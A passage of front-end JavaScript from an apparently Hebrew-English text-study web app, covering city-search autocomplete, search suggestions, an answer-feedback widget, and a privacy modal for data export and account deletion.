                const url = `/api/geocode/suggest?q=${encodeURIComponent(typed.trim())}&lang=${isHebrewMode() ? 'he' : 'en'}`;
                const res = await fetch(url, controller ? { signal: controller.signal } : undefined);
                const payload = res.ok ? await res.json() : null;
                if (serial !== citySuggest.serial) return;
                const results = Array.isArray(payload?.results) ? payload.results : [];
                citySuggest.items = orderCitySuggestions(results);
                citySuggest.active = citySuggest.items.length ? 0 : -1;
                renderCitySuggestions();
                const input = document.getElementById('citySearchInput');
                if (complete && input) completeCityInput(input, typed);
            } catch {
                if (serial === citySuggest.serial) clearCitySuggestions();
            }
        }

        function onCityInput(event) {
            const input = event.target;
            const typed = input.value;
            document.getElementById('citySearchError')?.classList.add('hidden');
            document.getElementById('citySearchStatus')?.classList.add('hidden');
            clearTimeout(citySuggest.timer);
            if (typed.trim().length < 2) {
                clearCitySuggestions();
                return;
            }
            // Only a letter typed at the end is completed: never while deleting or editing mid-word.
            const complete = String(event.inputType || 'insertText').startsWith('insert')
                && input.selectionStart === typed.length;
            citySuggest.queued = typed;
            citySuggest.timer = setTimeout(() => {
                citySuggest.queued = null;
                citySuggest.inflight = fetchCitySuggestions(typed, complete);
            }, CITY_SUGGEST_DELAY_MS);
        }

        // Enter right after a letter: wait for that letter's places, so the
        // choice is never a place listed for an earlier, shorter text.
        async function settleCitySuggestions() {
            if (citySuggest.queued !== null) {
                clearTimeout(citySuggest.timer);
                const typed = citySuggest.queued;
                citySuggest.queued = null;
                citySuggest.inflight = fetchCitySuggestions(typed, false);
            }
            await citySuggest.inflight;
        }

        async function acceptCityInput() {
            try {
                await settleCitySuggestions();
            } catch {
                // No suggestions to choose from; the plain search below still runs.
            }
            if (!chooseCitySuggestion(Math.max(citySuggest.active, 0))) searchByCity();
        }
        window.acceptCityInput = acceptCityInput;

        function chooseCitySuggestion(index) {
            const item = citySuggest.items[index];
            const input = document.getElementById('citySearchInput');
            if (!item) return false;
            if (input) input.value = item.name;
            document.getElementById('citySearchError')?.classList.add('hidden');
            clearCitySuggestions();
            try {
                applyCityLocation({ lat: Number(item.lat), lon: Number(item.lon) }, cityShortName(item));
            } catch {
                const errorEl = document.getElementById('citySearchError');
                errorEl.textContent = t('Search failed. Check your connection.', 'החיפוש נכשל. בדוק את החיבור שלך.');
                errorEl.classList.remove('hidden');
            }
            return true;
        }
        window.chooseCitySuggestion = chooseCitySuggestion;

        function moveCitySuggestion(step) {
            const count = citySuggest.items.length;
            if (!count) return;
            citySuggest.active = (citySuggest.active + step + count) % count;
            renderCitySuggestions();
        }

        document.addEventListener('input', function (e) {
            if (e.target?.id === 'citySearchInput') onCityInput(e);
        });

        const citySuggestList = document.getElementById('citySuggestList');
        // mousedown keeps the focus in the box, so the click lands on the place.
        citySuggestList?.addEventListener('mousedown', (e) => e.preventDefault());
        citySuggestList?.addEventListener('click', function (e) {
            const option = e.target.closest?.('[role="option"]');
            if (option) chooseCitySuggestion(Number(option.dataset.index));
        });

        // Enter takes the highlighted place (else asks the geocoder); arrows move.
        document.addEventListener('keydown', function (e) {
            const inCityBox = document.activeElement?.id === 'citySearchInput';
            if (inCityBox && (e.key === 'ArrowDown' || e.key === 'ArrowUp') && citySuggest.items.length) {
                e.preventDefault();
                moveCitySuggestion(e.key === 'ArrowDown' ? 1 : -1);
                return;
            }
            if (e.key === 'Enter' && inCityBox) {
                e.preventDefault();
                void acceptCityInput();
                return;
            }
            if (e.key === 'Escape' && citySuggest.items.length && inCityBox) {
                clearCitySuggestions();
                return;
            }
            if (e.key === 'Escape' && citySearchOpen) {
                closeCitySearchPopover();
            }
        });

        // Close city search on outside click
        document.addEventListener('click', function (e) {
            if (!citySearchOpen) return;
            const popover = document.getElementById('citySearchPopover');
            const btn = document.getElementById('citySearchBtn');
            if (popover && btn && !popover.contains(e.target) && !btn.contains(e.target)) {
                closeCitySearchPopover();
            }
        });
        // ─────────────────────────────────────────────────────────

        const debouncedSuggestionFetch = debounce(fetchOmniboxSuggestions, 250);

        searchInput.addEventListener('input', () => {
            suppressSuggestionMenu = false;
            debouncedSuggestionFetch(searchInput.value);
        });

        searchInput.addEventListener('focus', () => {
            if (suppressSuggestionMenu) return;
            if (isMobileViewport()) {
                setMobileSearchExpanded(true);
            }
            if ((searchInput.value || '').trim().length >= 2) {
                void fetchOmniboxSuggestions(searchInput.value);
            }
        });

        searchInput.addEventListener('keydown', async (e) => {
            if (searchSuggestions.classList.contains('hidden')) return;

            if (e.key === 'ArrowDown') {
                e.preventDefault();
                appState.activeSuggestionIndex = Math.min(
                    appState.activeSuggestionIndex + 1,
                    appState.suggestionItems.length - 1
                );
                renderSearchSuggestions();
                return;
            }

            if (e.key === 'ArrowUp') {
                e.preventDefault();
                appState.activeSuggestionIndex = Math.max(appState.activeSuggestionIndex - 1, -1);
                renderSearchSuggestions();
                return;
            }

            if (e.key === 'Escape') {
                cancelSuggestionFetch();
                hideSearchSuggestions();
                return;
            }

            if (e.key === 'Enter' && appState.activeSuggestionIndex >= 0) {
                e.preventDefault();
                const selected = appState.suggestionItems[appState.activeSuggestionIndex];
                const query = searchInput.value.trim();
                if (isMobileViewport()) setMobileSearchExpanded(false);
                await openSearchTarget(selected, query);
            }
        });

        document.addEventListener('keydown', (e) => {
            if (e.key !== 'Escape') return;
            if (!appState.prefs.shulMode) return;

            appState.prefs.shulMode = false;
            if (shulModeToggle) {
                shulModeToggle.checked = false;
            }
            savePrefs();
            applyShulMode();
        });

        // Pressing an option must not take focus from the field: the list
        // stays a popup of the input (and the phone keyboard stays up).
        searchSuggestions.addEventListener('mousedown', (e) => {
            if (e.target.closest('.suggestion-item')) e.preventDefault();
        });

        searchSuggestions.addEventListener('click', async (e) => {
            const btn = e.target.closest('.suggestion-item');
            if (!btn) return;
            const index = Number(btn.dataset.index);
            const selected = appState.suggestionItems[index];
            const query = searchInput.value.trim();
            // Picking a topic is the end of searching: put the normal top bar back
            // right away instead of after the (network-bound) navigation finishes.
            setMobileSearchExpanded(false);
            await openSearchTarget(selected, query);
        });

        // Tapping anywhere outside the open search field (and outside the tab bar,
        // whose buttons manage the search state themselves) closes it again.
        document.addEventListener('click', (e) => {
            if (!document.body.classList.contains('mobile-search-open')) return;
            if (e.target.closest?.('.topbar-search-wrap, .mobile-search-tray, #convHistoryPop') || mobileBottomTabs?.contains(e.target)) return;
            hideSearchSuggestions();
            setMobileSearchExpanded(false);
        });

        document.addEventListener('keydown', (e) => {
            if (e.key !== 'Escape' || !document.body.classList.contains('mobile-search-open')) return;
            hideSearchSuggestions();
            setMobileSearchExpanded(false);
        });

        document.addEventListener('click', (e) => {
            if (!searchForm.contains(e.target)) {
                hideSearchSuggestions();
            }
            if (settingsMenuContainer && !settingsMenuContainer.contains(e.target)) {
                closeSettingsMenu();
            }
            if (userProfileMenuContainer && !userProfileMenuContainer.contains(e.target)) {
                closeUserProfileMenu();
            }
            if (readerSettingsPanel
                && !readerSettingsPanel.contains(e.target)
                && !readerSettingsBtn?.contains(e.target)) {
                closeReaderSettingsPanel();
            }
        });

        // SUBMIT SEARCH LOGIC - Inline text navigation first, AI fallback second
        searchForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const question = sanitizeQuestionInput(searchInput.value);
            if (!question) return;

            if (question !== searchInput.value.trim()) {
                searchInput.value = question;
            }

            // The phone's search closes with the navigation it leads to, or stays
            // open to show a question loading (handleAiSearch closes it at the end).
            searchInput.blur();

            if (appState.activeSuggestionIndex >= 0 && appState.suggestionItems[appState.activeSuggestionIndex]) {
                await openSearchTarget(appState.suggestionItems[appState.activeSuggestionIndex], question);
                return;
            }

            // Use search as in-page navigation for topical/book lookups (e.g., "Genesis").
            if (!shouldPreferAiSearch(question)) {
                try {
                    const target = await resolveSearchTarget(question);
                    if (target && await openSearchTarget(target, question)) {
                        return;
                    }
                } catch {
                    // Fall back to AI search below when text resolution fails.
                }
            }

            await handleAiSearch(question);
            hideSearchSuggestions();
        });

        // Answer feedback widget. `container` is the target
        // div, `data` is the /ask response (data.meta carries mode/language/
        // fallback/safety_class — the same fields on every response branch,
        // see app.py::ask_question), `queryTitle` is the raw question text
        // (hashed server-side in backend/routes_feedback.py, never stored
        // verbatim).
        // Trusted, static icon markup only -- same pattern as
        // _PRIVACY_STATUS_ICONS below (built once at load from the server-rendered path data into
        // raw <path> markup, never combined with dynamic data via innerHTML).
        const _ANSWER_FEEDBACK_ICONS = {
            up: phosphorPathMarkup('thumbs-up'),
            down: phosphorPathMarkup('thumbs-down'),
            comment: phosphorPathMarkup('chat-text'),
        };

        // Which stored answer a rating is about: the owner's ask_history id,
        // or on a public shared link (/a/<token>) the token -- the server
        // resolves it to the row and never stores it (backend/routes_feedback.py
        // _linked_answer). An answer that was never stored sends neither.
        function feedbackAnswerLink(data) {
            if (data?.public) return data.share_token ? { share_token: String(data.share_token) } : {};
            const id = String(data?.history_id || data?.id || '').trim();
            return window.ShelahAskHistory?.isHistoryId(id) ? { history_id: id } : {};
        }

        // The quiet "Add a comment" control that sits beside the thumbs: a reader
        // can say something without rating (verdict "comment"), or add to a rating.
        function feedbackCommentButtonHtml() {
            return `<button type="button" class="answer-feedback-comment-btn" aria-expanded="false">
                <svg viewBox="0 0 256 256" fill="currentColor" aria-hidden="true">${_ANSWER_FEEDBACK_ICONS.comment}</svg>
                <span>${t('Add a comment', 'הוספת הערה')}</span></button>`;
        }

        // The two thumbs. `choice` is the pressed one ('' for none); they are
        // disabled once rated, and live again while the reader edits.
        function feedbackThumbsHtml(choice = '', disabled = false) {
            const thumb = (verdict, label, icon) => `<button type="button" class="answer-feedback-btn" data-verdict="${verdict}"
                aria-pressed="${choice === verdict}"${disabled ? ' disabled' : ''}
                aria-label="${label}"><svg viewBox="0 0 256 256" fill="currentColor" aria-hidden="true">${icon}</svg></button>`;
            return `<span class="answer-feedback-prompt">${t('Was this answer helpful?', 'האם התשובה הייתה מועילה?')}</span>
                ${thumb('helpful', t('Helpful', 'מועיל'), _ANSWER_FEEDBACK_ICONS.up)}
                ${thumb('not_helpful', t('Not helpful', 'לא מועיל'), _ANSWER_FEEDBACK_ICONS.down)}`;
        }

        // A reader can change what they sent: the server answers a rating with
        // its row id, and "Edit feedback" PATCHes that row (only the account or
        // device that wrote it may, backend/routes_feedback.py). Without an id
        // (an older server, a failed save) the widget works as it always did.
        function renderFeedbackWidget(container, data, queryTitle) {
            if (!container) return;
            const answerLink = feedbackAnswerLink(data);
            container.innerHTML = `
                <div class="answer-feedback" data-feedback-state="idle">
                    ${feedbackThumbsHtml()}
                    ${feedbackCommentButtonHtml()}
                </div>
            `;
            const root = container.querySelector('.answer-feedback');
            let rated = ''; // 'helpful' | 'not_helpful' once a thumb was pressed
            let savedComment = '';
            let rowId = null; // the stored row, once the server has said which
            let ratingSaved = Promise.resolve({ ok: false, id: null });

            // { ok, id }: ok when the server took it. A rating is best-effort (a
            // reader is never told it was lost); a typed comment is not, so it
            // reports back.
            async function submitFeedback(verdict, comment) {
                try {
                    const headers = await authHeaders({ 'Content-Type': 'application/json' });
                    const response = await fetch('/api/feedback', {
                        method: 'POST',
                        headers,
                        body: JSON.stringify({
                            question: queryTitle || '',
                            verdict,
                            comment: comment || '',
                            mode: data?.meta?.mode || 'balanced',
                            language: data?.meta?.language || 'en',
                            fallback: !!data?.meta?.fallback,
                            safety_class: data?.meta?.safety_class || 'ok',
                            ...answerLink,
                        }),
                    });
                    if (response?.ok === false) return { ok: false, id: null };
                    const body = await response.json().catch(() => null);
                    const id = String(body?.id || '');
                    return { ok: true, id: /^[0-9a-f-]{36}$/i.test(id) ? id : null };
                } catch {
                    return { ok: false, id: null };
                }
            }

            async function editFeedback(verdict, comment) {
                try {
                    const headers = await authHeaders({ 'Content-Type': 'application/json' });
                    const response = await fetch(`/api/feedback/${rowId}`, {
                        method: 'PATCH',
                        headers,
                        body: JSON.stringify({ verdict, comment, question: queryTitle || '' }),
                    });
                    return response?.ok !== false;
                } catch {
                    return false;
                }
            }

            function commentButton() {
                return root.querySelector('.answer-feedback-comment-btn');
            }

            function editButtonHtml() {
                return `<button type="button" class="answer-feedback-comment-btn answer-feedback-edit">${t('Edit feedback', 'עריכת המשוב')}</button>`;
            }

            function closeCommentRow({ refocus = false } = {}) {
                root.querySelector('.answer-feedback-comment-row')?.remove();
                const toggle = commentButton();
                if (toggle) {
                    toggle.setAttribute('aria-expanded', 'false');
                    if (refocus) toggle.focus();
                }
                if (root.dataset.feedbackState === 'commenting' && !rated) root.dataset.feedbackState = 'idle';
            }

            // The settled state: thanks, then "Edit feedback" once the row id is
            // known (or, without one, the comment control after a thumbs-up).
            // Focus that was inside the widget moves to the control left, so it
            // never drops to the page.
            function showThanks(withComment, message = t('Thank you for your feedback!', 'תודה על המשוב!')) {
                const hadFocus = root.contains(document.activeElement);
                root.dataset.feedbackState = 'done';
                const commentControl = withComment ? feedbackCommentButtonHtml() : '';
                const control = rowId ? editButtonHtml() : commentControl;
                root.innerHTML = `<span class="answer-feedback-thanks" role="status">${message}</span>${control}`;
                bindCommentButton();
                bindEditButton();
                if (hadFocus) (root.querySelector('button') || root).focus?.();
            }

            // The id came back after the thanks were drawn: offer Edit in place of
            // the comment control without redrawing (and re-announcing) the thanks.
            function offerEditWhenKnown() {
                void ratingSaved.then(() => {
                    if (!rowId || root.dataset.feedbackState !== 'done' || root.querySelector('.answer-feedback-edit')) return;
                    const old = commentButton();
                    const hadFocus = old && old === document.activeElement;
                    old?.remove();
                    root.insertAdjacentHTML('beforeend', editButtonHtml());
                    bindEditButton();
                    if (hadFocus) root.querySelector('.answer-feedback-edit').focus();
                });
            }

            // The comment is a row of its own when the reader has not rated, and
            // after a thumbs-up. After a rating with a known row it edits that
            // row; without one it travels with the verdict as a second row (the
            // original contract, so it still saves before the edit migration).
            async function saveComment(text) {
                if (rated) {
                    await ratingSaved;
                    if (rowId) return editFeedback(rated, text);
                    return (await submitFeedback(rated === 'not_helpful' ? 'not_helpful' : 'comment', text)).ok;
                }
                const result = await submitFeedback('comment', text);
                if (result.ok && result.id) rowId = result.id;
                return result.ok;
            }

            async function sendComment(row) {
                const field = row.querySelector('textarea');
                const text = field.value.trim();
                if (!text) {
                    if (rated) showThanks(false);
                    else field.focus();
                    return;
                }
                const send = row.querySelector('.answer-feedback-submit');
                const problem = row.querySelector('.answer-feedback-error');
                send.disabled = true;
                problem.hidden = true;
                if (await saveComment(text)) {
                    savedComment = text;
                    showThanks(false);
                    return;
                }
                send.disabled = false;
                problem.hidden = false;
                field.focus();
            }

            function commentRowHtml({ edit = false, skip = false } = {}) {
                return `
                    <textarea maxlength="500" dir="auto"></textarea>
                    <p class="answer-feedback-error" role="alert" hidden>${t('Could not send that. Please try again.', 'לא הצלחנו לשלוח. אפשר לנסות שוב.')}</p>
                    <div class="answer-feedback-actions">
                        <button type="button" class="answer-feedback-submit"></button>
                        ${edit ? `<button type="button" class="answer-feedback-secondary answer-feedback-cancel">${t('Cancel', 'ביטול')}</button>` : ''}
                        ${skip ? `<button type="button" class="answer-feedback-secondary answer-feedback-skip">${t('No thanks', 'לא תודה')}</button>` : ''}
                    </div>
                `;
            }

            function openCommentRow() {
                let row = root.querySelector('.answer-feedback-comment-row');
                if (!row) {
                    row = document.createElement('div');
                    row.className = 'answer-feedback-comment-row';
                    row.innerHTML = commentRowHtml({ skip: rated === 'not_helpful' });
                    root.appendChild(row);
                    row.querySelector('.answer-feedback-submit').addEventListener('click', () => { void sendComment(row); });
                    row.querySelector('.answer-feedback-skip')?.addEventListener('click', () => showThanks(false));
                    row.querySelector('textarea').addEventListener('keydown', (event) => {
                        if (event.key === 'Escape') {
                            event.preventDefault();
                            // Rated: the prompt is optional, so Escape is "No thanks".
                            if (rated) showThanks(false);
                            else closeCommentRow({ refocus: true });
                        } else if (event.key === 'Enter' && (event.metaKey || event.ctrlKey)) {
                            event.preventDefault();
                            void sendComment(row);
                        }
                    });
                } else if (rated === 'not_helpful' && !row.querySelector('.answer-feedback-skip')) {
                    // Thumbs-down while a comment was already open: it is now optional.
                    row.querySelector('.answer-feedback-actions').insertAdjacentHTML('beforeend',
                        `<button type="button" class="answer-feedback-secondary answer-feedback-skip">${t('No thanks', 'לא תודה')}</button>`);
                    row.querySelector('.answer-feedback-skip').addEventListener('click', () => showThanks(false));
                }
                const field = row.querySelector('textarea');
                const prompt = rated === 'not_helpful'
                    ? t('What went wrong? (optional)', 'מה השתבש? (אופציונלי)')
                    : t('Add a comment', 'הוספת הערה');
                field.placeholder = prompt;
                field.setAttribute('aria-label', prompt);
                row.querySelector('.answer-feedback-submit').textContent = rated === 'not_helpful'
                    ? t('Send feedback', 'שלח משוב')
                    : t('Send comment', 'שליחת הערה');
                const toggle = commentButton();
                if (toggle) toggle.setAttribute('aria-expanded', 'true');
                return field;
            }

            // Edit: the thumbs come back live with the saved one pressed, and the
            // comment box holds what was sent. Save changes that row; Cancel (or
            // Escape) leaves it exactly as it was.
            function openEditor() {
                let choice = rated;
                root.dataset.feedbackState = 'editing';
                root.innerHTML = `${feedbackThumbsHtml(choice)}<div class="answer-feedback-comment-row">${commentRowHtml({ edit: true })}</div>`;
                const thumbs = Array.from(root.querySelectorAll('.answer-feedback-btn'));
                const row = root.querySelector('.answer-feedback-comment-row');
                const field = row.querySelector('textarea');
                const save = row.querySelector('.answer-feedback-submit');
                const problem = row.querySelector('.answer-feedback-error');
                const label = t('Your comment (optional)', 'ההערה שלך (אופציונלי)');
                field.value = savedComment;
                field.placeholder = label;
                field.setAttribute('aria-label', label);
                save.textContent = t('Save', 'שמירה');
                const cancel = () => showThanks(false);

                thumbs.forEach((thumb) => thumb.addEventListener('click', () => {
                    choice = thumb.dataset.verdict;
                    thumbs.forEach((b) => b.setAttribute('aria-pressed', String(b === thumb)));
                }));
                row.querySelector('.answer-feedback-cancel').addEventListener('click', cancel);
                field.addEventListener('keydown', (event) => {
                    if (event.key === 'Escape') {
                        event.preventDefault();
                        cancel();
                    }
                });
                save.addEventListener('click', async () => {
                    const text = field.value.trim();
                    const verdict = choice || 'comment';
                    if (verdict === 'comment' && !text) {
                        field.focus();
                        return;
                    }
                    save.disabled = true;
                    problem.hidden = true;
                    if (await editFeedback(verdict, text)) {
                        rated = choice;
                        savedComment = text;
                        showThanks(false, t('Your feedback was updated.', 'המשוב עודכן.'));
                        return;
                    }
                    save.disabled = false;
                    problem.hidden = false;
                    field.focus();
                });
                (thumbs.find((b) => b.getAttribute('aria-pressed') === 'true') || thumbs[0]).focus();
            }

            function bindEditButton() {
                root.querySelector('.answer-feedback-edit')?.addEventListener('click', openEditor);
            }

            function bindCommentButton() {
                const toggle = root.querySelector('.answer-feedback-comment-btn:not(.answer-feedback-edit)');
                if (!toggle) return;
                toggle.addEventListener('click', () => {
                    if (root.querySelector('.answer-feedback-comment-row')) {
                        closeCommentRow({ refocus: true });
                        return;
                    }
                    if (root.dataset.feedbackState === 'idle') root.dataset.feedbackState = 'commenting';
                    openCommentRow().focus();
                });
            }
            bindCommentButton();

            const buttons = Array.from(root.querySelectorAll('.answer-feedback-btn'));
            buttons.forEach((btn) => {
                btn.addEventListener('click', () => {
                    if (rated) return;
                    const verdict = btn.dataset.verdict;
                    rated = verdict;
                    buttons.forEach((b) => b.setAttribute('aria-pressed', String(b === btn)));
                    buttons.forEach((b) => { b.disabled = true; });

                    // Submit the bare verdict immediately so a reader who never
                    // fills in the optional comment (the common case) is still
                    // counted — waiting on the comment box risked losing the
                    // verdict entirely to abandonment.
                    ratingSaved = submitFeedback(verdict, '').then((result) => {
                        if (result.id) rowId = result.id;
                        return result;
                    });

                    const writing = root.querySelector('.answer-feedback-comment-row');
                    if (verdict === 'not_helpful') {
                        root.dataset.feedbackState = 'commenting';
                        openCommentRow();
                        // A reader who already opened the box has typed in it; keep focus there.
                        if (!writing) root.querySelector('.answer-feedback-comment-row textarea').focus();
                    } else if (writing) {
                        // They are mid-comment: let them finish it.
                        root.dataset.feedbackState = 'commenting';
                        openCommentRow();
                    } else {
                        showThanks(true);
                        offerEditWhenKnown();
                    }
                });
            });
        }

        // Asking sets currentView to 'ask' while the answer is only a panel
        // over the page; once it closes (conversation-ui.js closePanel), the
        // page underneath gets its view back (bookmark button, title, the
        // reader's scroll-synced URL).
        function restoreShownView() {
            const shown = appState.shownView;
            if (!shown || appState.currentView === shown.view) return;
            appState.currentView = shown.view;
            window.ShelahState?.setState({ currentView: shown.view });
            updateBookmarkButton();
            syncDocumentTitle();
        }

        // Whether the page `route` names is the one already on screen, e.g.
        // Back off an answer, a conversation or a calendar day: the page
        // under it stays as it was instead of being blanked and refetched
        // (a text losing its scroll position and loaded sections).
        function routeViewOnScreen(route) {
            const shown = appState.shownView;
            if (!shown) return false;
            // An answer is a panel over the page, never the page itself.
            if (route.chat || route.a) return false;
            if (route.text) {
                return shown.type === 'text' && getCurrentTextPayloadChain()
                    .some((chunk) => chunk?.ref && textRefWithin(route.text, chunk.ref));
            }
            if (route.prayer) return shown.type === 'prayer' && shown.value === route.prayer;
            // The same service, whichever of its sections the URL names.
            if (route.siddur) return shown.type === 'siddur' && Boolean(window.ShelahSiddur?.isShowing(route.siddur));
            if (route.community) return shown.type === 'community' && shown.value === route.community;
            if (route.history) return shown.type === 'history';
            return shown.type === 'home';
        }

        // ─── Privacy & Data modal (self-serve data request) ────────────────────
        // Guards the delete-account request: closing the modal (backdrop
        // click / Escape / Close button) or resubmitting must not abandon
        // an in-flight irreversible delete request -- see
        // handlePrivacyDeleteAccount() below.
        let privacyDeleteInFlight = false;
        let privacyDataModalTrigger = null;

        // Trusted, static icon markup only -- never combined with dynamic
        // data via innerHTML (the message text is always set separately via
        // textContent below) so this stays injection-safe even though the
        // source strings here are already backend-controlled, not raw user
        // input.
        const _PRIVACY_STATUS_ICONS = {
            success: phosphorPathMarkup('check-circle'),
            problem: phosphorPathMarkup('warning-circle'),
        };
        const _PRIVACY_STATUS_KINDS = new Set(['pending', 'success', 'warning', 'error']);

        // Renders the export/delete status regions as a proper alert box
        // (icon + message) instead of plain gray text, and is the single
        // place that maps outcome -> visual treatment so export and delete
        // stay consistent. kind is '' to clear, or one of
        // pending/success/warning/error.
        function _setPrivacyStatus(el, kind, message) {
            if (!el) return;
            if (!kind || !message) {
                el.className = 'hidden';
                el.innerHTML = '';
                return;
            }
            // .privacy-status (the modal's <style>) tints by data-kind.
            el.className = 'privacy-status';
            el.dataset.kind = _PRIVACY_STATUS_KINDS.has(kind) ? kind : 'pending';
            let iconPath = _PRIVACY_STATUS_ICONS.problem;
            if (kind === 'success') iconPath = _PRIVACY_STATUS_ICONS.success;
            else if (kind === 'pending') iconPath = '';
            el.innerHTML = (iconPath
                ? `<svg viewBox="0 0 256 256" fill="currentColor" aria-hidden="true">${iconPath}</svg>`
                : '') + '<span></span>';
            el.querySelector('span').textContent = message;
        }

        function openPrivacyDataModal() {
            closeUserProfileMenu();
            const modal = document.getElementById('privacyDataModal');
            if (!modal) return;
            const exportStatus = document.getElementById('privacyDataExportStatus');
            const deleteStatus = document.getElementById('privacyDeleteStatus');
            const confirmInput = document.getElementById('privacyDeleteConfirmInput');
            const deleteBtn = document.getElementById('privacyDeleteAccountBtn');
            _setPrivacyStatus(exportStatus, '', '');
            _setPrivacyStatus(deleteStatus, '', '');
            if (confirmInput) { confirmInput.value = ''; confirmInput.disabled = false; }
            if (deleteBtn) deleteBtn.disabled = true;
            privacyDataModalTrigger = document.activeElement;
            modal.style.display = 'flex';
            presentEl(modal, modalMotion(modal));
            const closeBtn = document.getElementById('privacyDataModalCloseBtn');
            if (closeBtn) closeBtn.focus();
        }

        function closePrivacyDataModal() {
            // A delete request is in flight (already committed server-side,
            // irreversible) -- ignore backdrop/Escape/Close attempts so the
            // status message stays visible until it resolves. See the
            // frontend-ux-safety review that flagged this modal closing out
            // from under a pending destructive request.
            if (privacyDeleteInFlight) return;
            const modal = document.getElementById('privacyDataModal');
            if (!modal) return;
            dismissEl(modal, { ...modalMotion(modal), onHidden: () => { modal.style.display = 'none'; } });
            if (privacyDataModalTrigger && typeof privacyDataModalTrigger.focus === 'function') {
                privacyDataModalTrigger.focus();
            }
            privacyDataModalTrigger = null;
        }

        function handlePrivacyDeleteConfirmInput() {
            const confirmInput = document.getElementById('privacyDeleteConfirmInput');
            const deleteBtn = document.getElementById('privacyDeleteAccountBtn');
            if (!confirmInput || !deleteBtn) return;
            deleteBtn.disabled = confirmInput.value.trim() !== 'DELETE';
        }

        // What this browser keeps on its own (recent history, the shelf,
        // settings), so the download covers it alongside the server's copy.
        function privacyLocalExport() {
            const shelf = getShelfData();
            let settings = {};
            try { settings = JSON.parse(localStorage.getItem(APP_PREFS_KEY) || '{}'); } catch { /* unreadable */ }
            return {
                recent_history: shelf.recent,
                shelf_bookmarks: shelf.bookmarks,
                notes: shelf.notes,
                study_tracks: shelf.tracks,
                settings,
            };
        }

        async function handlePrivacyDataExport() {
            const statusEl = document.getElementById('privacyDataExportStatus');
            const btn = document.getElementById('privacyDataExportBtn');
            if (btn) btn.disabled = true;
            _setPrivacyStatus(statusEl, 'pending', isHebrewMode() ? 'מכין הורדה...' : 'Preparing your download...');
            try {
                const headers = await authHeaders({ Accept: 'application/json' });
                const response = await fetch('/api/user/data-export', { headers });
                if (!response.ok) {
                    throw new Error(`Export failed (${response.status})`);
                }
                const payload = await response.json();
                payload.this_device = privacyLocalExport();
                const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
                const blobUrl = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = blobUrl;
                link.download = `shelah-data-export-${new Date().toISOString().slice(0, 10)}.json`;
                document.body.appendChild(link);
                link.click();
                link.remove();
                URL.revokeObjectURL(blobUrl);
                const failedCategories = payload?.partial_errors
                    ? Object.keys(payload.partial_errors)
                    : [];
                if (failedCategories.length) {
                    _setPrivacyStatus(statusEl, 'warning', isHebrewMode()
                        ? `ההורדה החלה, אך קטגוריות אלו לא נכללו: ${failedCategories.join(', ')}. נסה שוב מאוחר יותר.`
                        : `Download started, but these categories could not be included: ${failedCategories.join(', ')}. Please try again later.`);
                } else {
                    _setPrivacyStatus(statusEl, 'success', isHebrewMode() ? 'ההורדה החלה.' : 'Download started.');
                }
            } catch (err) {
                console.error('Data export failed:', err);
                _setPrivacyStatus(statusEl, 'error', isHebrewMode()
                    ? 'ההורדה נכשלה. נסה שוב מאוחר יותר.'
                    : 'Download failed. Please try again later.');
            } finally {
                if (btn) btn.disabled = false;
            }
        }

        // What a delete-account reply that is anything short of full success
        // means for the reader: the server's own message, else which part of
        // the account is left over.
        function privacyDeleteFailureMessage(response, body) {
            const failedTables = body?.table_errors ? Object.keys(body.table_errors) : [];
            let detail = '';
            if (failedTables.length) {
                detail = isHebrewMode()
                    ? ` (קטגוריות שנכשלו: ${failedTables.join(', ')})`
                    : ` (failed categories: ${failedTables.join(', ')})`;
            } else if (body?.clerk_error) {
                detail = isHebrewMode() ? ' (מחיקת ההתחברות נכשלה)' : ' (sign-in deletion failed)';
            }
            return body?.error || `Delete incomplete (${response.status})${detail}`;
        }

        async function requestAccountDeletion() {
            const headers = await authHeaders({ 'Content-Type': 'application/json' });
            const response = await fetch('/api/user/delete-account', {
                method: 'POST',
                headers,
                body: JSON.stringify({ confirmation: 'DELETE' }),
            });
            const body = await response.json().catch(() => ({}));

            // The backend only reports full success (ok: true) once every
            // Supabase table AND the Clerk identity are confirmed deleted
            // -- a 200 with ok:false, or any 207, means something is left
            // over (see backend/routes_privacy.py::delete_account). Do
            // NOT sign the user out or redirect on anything less than
            // that, and never close the modal before showing why.
            if (!response.ok || body?.ok !== true) {
                throw new Error(privacyDeleteFailureMessage(response, body));
            }
        }

        async function handlePrivacyDeleteAccount() {
            const confirmInput = document.getElementById('privacyDeleteConfirmInput');
            const statusEl = document.getElementById('privacyDeleteStatus');
            const deleteBtn = document.getElementById('privacyDeleteAccountBtn');
            if (confirmInput?.value.trim() !== 'DELETE') return;
            if (privacyDeleteInFlight) return;

            privacyDeleteInFlight = true;
            if (deleteBtn) deleteBtn.disabled = true;
            if (confirmInput) confirmInput.disabled = true;
            _setPrivacyStatus(statusEl, 'pending', isHebrewMode() ? 'מוחק את החשבון...' : 'Deleting your account...');

            try {
                await requestAccountDeletion();

                // Deletion is fully confirmed at this point -- close the
                // modal now. handleSignOut() is wrapped separately: if it
                // throws (e.g. the Clerk client session is already invalid
                // since the identity was just deleted server-side), that is
                // not a deletion failure and must not land an error message
                // in a modal the user can no longer see (see the
                // frontend-ux-safety finding this replaced).
                closePrivacyDataModal();
                try {
                    await handleSignOut();
                } catch (signOutErr) {
                    console.error('Post-deletion sign-out failed (account already deleted):', signOutErr);
                }
                window.location.assign('/');
            } catch (err) {
                console.error('Account deletion failed:', err);
                _setPrivacyStatus(statusEl, 'error', isHebrewMode()
                    ? `המחיקה לא הושלמה במלואה: ${err.message}. חלק מהנתונים עשויים עדיין להתקיים -- נסה שוב או צור קשר בדוא"ל.`
                    : `Deletion did not fully complete: ${err.message}. Some data may still remain -- please try again or contact us by email.`);
            } finally {
                privacyDeleteInFlight = false;
                if (deleteBtn) deleteBtn.disabled = confirmInput?.value.trim() !== 'DELETE';
                if (confirmInput) confirmInput.disabled = false;
            }
        }

        // Allow closing modal with Escape key
        document.addEventListener('keydown', (e) => {
            if (e.altKey && e.shiftKey && e.key.toLowerCase() === 'i') {
                e.preventDefault();
                openDevtoolsInspector();
                return;
            }

            if (e.key === 'Escape') {
                closeSettingsMenu();
                closeReaderSettingsPanel();
                closeTextsMenu();
                // chapterGridModal is a native <dialog> — its own 'cancel'
                // listener (see closeChapterGrid's registration) already
                // handles Escape; calling closeChapterGrid() here too would
                // double-fire on every Escape press.
                closeMobilePanels();
                closeDevtoolsInspector();
                closePrivacyDataModal();
            }
        });
